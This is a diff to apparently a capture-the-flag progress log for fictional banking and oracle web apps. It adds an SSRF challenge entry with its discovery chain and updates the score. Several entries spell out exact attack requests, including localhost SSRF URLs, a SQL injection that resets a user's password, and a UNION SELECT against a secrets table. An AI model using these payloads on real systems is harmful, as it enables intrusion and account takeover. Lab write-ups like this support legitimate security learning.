@@ -32,8 +32,9 @@
 | Second Chances | Alpaca | 500 | SQLi to call `reset_password_token('pkapoor','Hacked123!')` via OR injection in `GET /api/transactions?search=` |
 
 | Ask a Crooked Question | Alpaca | 340 | SQLi on oracle search → `oracle_service_secrets` table → `search_flag = 383342zBE-56aT13f3625` → submitted to crwd-ctrl |
+| Trust Issues | Octopus | 300 | SSRF via `GET /api/cards/1/reward-points?rewardServiceUrl=http://localhost/internal/files/reward_client.json` → flag `DMP_FLAG_SSRF_INTERNAL_FILE_ACCESS` |
 
-**Total earned: 3260 pts**
+**Total earned: 3560 pts**
 
 ---
 
@@ -63,6 +64,16 @@
 - **Exact request:** `GET /api/oracle/markets?search=...` with UNION SELECT from oracle_service_secrets
 - **Flag:** `383342zBE-56aT13f3625` (from `oracle_service_secrets` where `secret_key='search_flag'`)
 - **SQLi trick:** Use `TIMESTAMP '9999-12-31 00:00:00'` for future-date sort (sorts first), close string with `AND col>'` instead of `--`
+
+### Trust Issues — 300 pts ✅
+- **Vulnerability:** SSRF via `rewardServiceUrl` parameter on the Dark Rewards card endpoint
+- **Exact request:** `GET /api/cards/1/reward-points?rewardServiceUrl=http://localhost/internal/files/reward_client.json`
+- **Discovery chain:**
+  1. Navigate to `/cards` → see "Dark Rewards" section → note network call to `/api/cards/1/reward-points?rewardServiceUrl=https://rewards.darkmoney-bank.com/api/points`
+  2. Send internal URL → 400 error leaks: `{"location":"/localhost/internal/files","filesAvailable":["reward_client.json","rewards_backup.txt"]}`
+  3. Use leaked path: `rewardServiceUrl=http://localhost/internal/files/reward_client.json` → 200 `{"flag":"DMP_FLAG_SSRF_INTERNAL_FILE_ACCESS"}`
+- **Flag:** `DMP_FLAG_SSRF_INTERNAL_FILE_ACCESS`
+- **Submission:** CHALLENGE_KEY form on crwd-ctrl
 
 ### Frozen Assets (Alpaca)
 - **Vector:** Bypass UI restriction to fund bill payment from frozen account
